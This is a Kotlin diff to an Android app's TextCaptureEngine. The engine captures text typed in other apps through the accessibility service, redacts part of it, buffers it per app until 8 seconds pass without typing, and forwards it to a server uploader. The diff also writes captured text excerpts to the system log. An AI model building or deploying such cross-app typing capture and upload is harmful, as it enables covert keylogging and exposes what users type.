@@ -5,6 +5,7 @@ import android.content.Context
 import android.util.Log
 import com.flanergide.core.StateStore
 import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.distinctUntilChanged
 import kotlinx.coroutines.flow.map
 import kotlinx.coroutines.launch
@@ -22,9 +23,17 @@ import kotlinx.coroutines.launch
 object TextCaptureEngine {
     private const val TAG = "TextCaptureEngine"
     private const val MAX_LOG_SIZE = 1000
+    private const val IDLE_TIMEOUT_MS = 8000L  // 8 seconds of no typing = flush
 
     private lateinit var context: Context
+    private lateinit var scope: CoroutineScope
     private val capturedTextLog = mutableListOf<CapturedText>()
+
+    // Batching state
+    private var currentBuffer = StringBuilder()
+    private var currentAppPackage = ""
+    private var lastActivityTime = 0L
+    private var idleTimerJob: kotlinx.coroutines.Job? = null
 
     /**
      * Initialize TextCaptureEngine.
@@ -32,7 +41,8 @@ object TextCaptureEngine {
      */
     fun init(appContext: Context, scope: CoroutineScope) {
         context = appContext.applicationContext
-        Log.i(TAG, "Initializing TextCaptureEngine")
+        this.scope = scope
+        Log.i(TAG, "Initializing TextCaptureEngine (idle timeout: ${IDLE_TIMEOUT_MS}ms)")
 
         // Subscribe to accessibility permission state
         scope.launch {
@@ -43,7 +53,10 @@ object TextCaptureEngine {
                     if (enabled) {
                         Log.i(TAG, "Accessibility service enabled - ready to capture text")
                     } else {
-                        Log.w(TAG, "Accessibility service disabled - clearing log")
+                        Log.w(TAG, "Accessibility service disabled - clearing log and buffer")
+                        synchronized(this@TextCaptureEngine) {
+                            flushBufferLocked()
+                        }
                         clear()
                     }
                 }
@@ -51,8 +64,8 @@ object TextCaptureEngine {
     }
 
     /**
-     * Add captured text to log with redaction.
-     * Also forwards to LogUploader for batch upload to server.
+     * Add captured text to buffer. Batches by idle timeout instead of per-character logging.
+     * Only emits to LogUploader when idle timeout expires.
      */
     fun addCapturedText(text: String, appPackage: String) {
         if (text.isBlank()) return
@@ -62,40 +75,82 @@ object TextCaptureEngine {
         // Apply context-aware redaction
         val redactedText = SensitiveDataRedactor.redactForApp(text, appPackage)
 
-        // Check if text was redacted
-        val wasRedacted = text != redactedText
-        if (wasRedacted) {
-            Log.d(TAG, "Sensitive data redacted. Before: ${text.take(50)}... → After: ${redactedText.take(50)}...")
-        }
-
         // Skip if redaction resulted in generic placeholder (e.g., password manager activity)
         if (redactedText == "[PASSWORD_MANAGER_ACTIVITY]") {
-            Log.d(TAG, "Skipping password manager activity (redacted entirely)")
+            Log.d(TAG, "Skipping password manager activity")
             return
         }
 
-        // Create captured text entry
+        synchronized(this) {
+            // App changed - flush previous buffer before starting new one
+            if (currentAppPackage.isNotEmpty() && currentAppPackage != appPackage) {
+                Log.d(TAG, "App changed from $currentAppPackage to $appPackage - flushing buffer")
+                flushBufferLocked()
+            }
+
+            currentAppPackage = appPackage
+            currentBuffer.append(redactedText)
+            lastActivityTime = System.currentTimeMillis()
+
+            Log.v(TAG, "Buffered text (${currentBuffer.length} chars, app: $appPackage)")
+        }
+
+        // Cancel previous timeout and schedule new one (outside synchronized block)
+        idleTimerJob?.cancel()
+        idleTimerJob = scope.launch {
+            try {
+                delay(IDLE_TIMEOUT_MS)
+                // Check if still idle (no new activity in timeout period)
+                synchronized(this@TextCaptureEngine) {
+                    if (System.currentTimeMillis() - lastActivityTime >= IDLE_TIMEOUT_MS) {
+                        Log.d(TAG, "Idle timeout triggered - flushing buffer")
+                        flushBufferLocked()
+                    }
+                }
+            } catch (e: kotlinx.coroutines.CancellationException) {
+                // Timer was cancelled due to new activity - this is expected
+            }
+        }
+    }
+
+    /**
+     * Flush buffered text to log and upload queue.
+     * Must be called while holding the object lock.
+     */
+    private fun flushBufferLocked() {
+        if (currentBuffer.isEmpty()) {
+            return
+        }
+
+        val bufferedText = currentBuffer.toString()
+        val appPackage = currentAppPackage
+
+        // Add to in-memory log
         val capturedText = CapturedText(
-            text = redactedText,
+            text = bufferedText,
             appPackage = appPackage,
             timestamp = System.currentTimeMillis()
         )
 
-        synchronized(capturedTextLog) {
-            // Add to log
-            capturedTextLog.add(capturedText)
-
-            // Maintain circular buffer (keep only last MAX_LOG_SIZE entries)
-            if (capturedTextLog.size > MAX_LOG_SIZE) {
-                capturedTextLog.removeAt(0)
-            }
-
-            val currentSize = capturedTextLog.size
-            Log.i(TAG, "✓ Captured from $appPackage: \"${redactedText.take(60)}...\" (log size: $currentSize/$MAX_LOG_SIZE)")
+        capturedTextLog.add(capturedText)
+        if (capturedTextLog.size > MAX_LOG_SIZE) {
+            capturedTextLog.removeAt(0)
         }
 
-        // Forward to LogUploader for server upload
-        LogUploader.addLog(capturedText)
+        val currentSize = capturedTextLog.size
+        Log.i(TAG, "✓ Captured from $appPackage: \"${bufferedText.take(60)}...\" (log size: $currentSize/$MAX_LOG_SIZE)")
+
+        // Send to LogUploader for batched upload
+        try {
+            LogUploader.addLog(capturedText)
+            Log.i(TAG, "Flushed buffer: '${bufferedText.take(50)}...' from $appPackage (${bufferedText.length} chars)")
+        } catch (e: Exception) {
+            Log.w(TAG, "Failed to add log to uploader: ${e.message}")
+        }
+
+        // Clear buffer
+        currentBuffer.clear()
+        currentAppPackage = ""
     }
 
     /**
